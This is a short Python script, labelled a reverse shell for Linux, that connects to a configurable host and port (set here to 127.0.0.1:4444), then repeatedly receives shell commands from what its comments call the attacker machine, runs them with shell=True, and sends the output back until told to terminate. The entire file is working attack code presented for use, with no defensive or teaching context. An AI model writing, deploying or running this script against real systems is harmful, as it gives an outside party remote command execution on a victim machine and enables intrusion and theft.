#!/usr/bin/python
# reverse shell for linux
# imports here
import os
import socket,subprocess,pty
HOST = '127.0.0.1'    # The remote host
PORT = 4444         # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.sendall(b'connection Established\n\n')
# start loop
while 1:
     s.send(b"SHELL@ %s >>"% os.getcwd().encode())
     # recieve shell command
     data = s.recv(1024).decode()
     if 'terminate' in data:
         s.close()
         break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
